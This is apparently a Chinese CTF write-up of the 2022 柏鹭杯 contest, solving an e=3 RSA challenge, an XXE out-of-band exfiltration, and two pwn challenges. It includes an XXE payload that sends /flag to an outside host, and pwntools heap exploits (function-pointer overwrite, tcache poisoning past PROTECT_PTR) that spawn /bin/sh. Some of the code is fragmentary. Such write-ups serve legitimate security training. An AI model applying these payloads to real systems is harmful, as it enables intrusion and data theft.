---
title: 2022 柏鹭杯 WP – Polaris 战队
contest: 2022 柏鹭杯 (Polaris)
year: 2022
difficulty: hard
vuln_type: [crypto_rsa, xxe, pwn_unknown, lfi, heap_exploit]
tags: [柏鹭杯, e=3-RSA, 立方根爆破, XXE, OOB, pwntools-shell-class, libc-2.31, libc-2.35, function-pointer-overwrite, edit_buf+func, PROTECT_PTR, edit_func]
attack_chain: ["Q1 e=3 RSA: c + n*k 的立方根爆破, iroot(c+n*k, 3) 还原明文", "Q2 XXE: <!DOCTYPE test [<!ENTITY % file SYSTEM 'php://filter/read=convert.base64-encode/resource=/flag'>]> + OOB", "Q3 PWN note1: edit_buf + edit_func + func, function pointer 覆盖, system('/bin/sh')", "Q4 PWN note2: libc-2.31 → libc-2.35 PROTECT_PTR bypass, tcache poisoning, fclose hook"]
key_payload: "for k in range(200000000): if gmpy2.iroot(c+n*k, 3)[1] == 1: print(long_to_bytes(iroot(c+n*k, 3)[0]))"
one_liner: 2022 柏鹭杯：e=3 RSA 立方根爆破 + XXE + pwn function pointer 覆盖
lesson: e=3 RSA + m^3 < n 直接开根；XXE OOB 是经典；function pointer 覆盖是 pwn 入门
quality: high
---

# 2022 柏鹭杯 WP – Polaris 战队

原文 https://www.ctfiot.com/57173.html （注：原文部分 NUL 字节污染，meta 基于可读内容）

## Q1: e=3 RSA
```python
import gmpy2
c = 245706948983578125207381542250496498816013566056746784517750313129260641531958753796767585019918349086418623783735870113758961768070508663333735022553426097977049927
for k in range(200000000):
    if gmpy2.iroot(c + n*k, 3)[1] == 1:
        res = gmpy2.iroot(c + n*k, 3)[0]
        print(long_to_bytes(res))
        break
```
- e=3 + m^3 < n → 直接开立方
- m^3 + n*k = c 找 k 整除立方根

## Q2: XXE OOB
```xml
<!DOCTYPE test [
  <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
  <!ENTITY % hack SYSTEM "http://ip/123.dtd">
  %hack;
  %dtd;
  %xxe;
]>
<!ENTITY % dtd "<!ENTITY &#x25; xxe SYSTEM 'http://ip:3333/%file;'> ">
```
- php://filter base64 读 flag
- 加载外部 dtd → OOB 外带

## Q3: PWN note1 (function pointer 覆盖)
```python
class Shell():
    def add(self, id, length, content, tag, func):
        # add(id, len, content, tag, func)
    def edit_tag(self, id, tag): ...
    def edit_func(self, id, func): ...
    def edit_buf(self, id, length, content): ...
    def func(self, id): ...  # 触发 function

sh = Shell()
# Step 1: leak image base
sh.add(0, 0x500, b'b' * 0x100, b'', 0)
sh.edit_tag(0, b'a')
sh.edit_func(0, ...)
sh.func(0)
sh.recvuntil(b'a')
image_base = u64(sh.recvn(6).ljust(8, b'\x00')) - 0x131b

# Step 2: overwrite func pointer → libc system
sh.edit_buf(0, 0x17, b'')
sh.add(1, 0x17, b'', b'', 0)
sh.edit_buf(0, 0x101, b'b' * 0x20 + p64(0) + p64(image_base + 0x131b) + p64(image_base + 0x3FA8))
sh.func(1)
sh.recvuntil(b'name:')
libc_addr = u64(sh.recvn(6).ljust(8, b'\x00')) - 0x61c90

sh.edit_buf(0, 0x101, b'b' * 0x20 + b'/bin/sh\x00' + p64(libc_addr + 0x52290))
sh.func(1)  # system('/bin/sh')
sh.interactive()
```

## Q4: PWN note2 (libc-2.35 PROTECT_PTR)
```python
sh.add(0, 0x18, b'')  # 触发 unsorted bin 残留指针
sh.delete(0)
sh.show(0)  # leak heap_addr = u64(...) * 0x1000
for i in range(9):
    sh.add(i, 0x88, b'')
for i in range(8):
    sh.delete(i)
sh.show(7)  # leak libc_addr - 0x219ce0

# tcache poisoning bypass PROTECT_PTR
offset = 0x2652e0
sh.add(0, 0x100, b'a' * 0x80 + p64(0) + p64(0x21))
sh.add(1, 0x18, b'')
sh.delete(1); sh.delete(8); sh.delete(0)
sh.add(0, 0x100, b'a' * 0x80 + p64(0) + p64(0x21) + p64((heap_addr >> 12) ^ (libc_addr + offset)))
sh.add(1, 0x18, p64(libc_addr + 0xebcf1))
sh.add(2, 0x18, p64(heap_addr + 0x740 - 0x3d78))
sh.sendlineafter(b'> ', b'4')  # trigger
sh.interactive()
```

## 教学价值
- **e=3 RSA 立方根** 入门 crypto
- **XXE OOB** 数据外带
- **function pointer 覆盖** pwn 入门
- **libc-2.35 PROTECT_PTR 绕过** 现代 pwn
- **pwntools Shell 类封装** 实战模板

## 工具
- pwntools
- gmpy2
- SageMath

## 关联
- 柏鹭杯是福建省级 CTF
- 涵盖：crypto / web / pwn
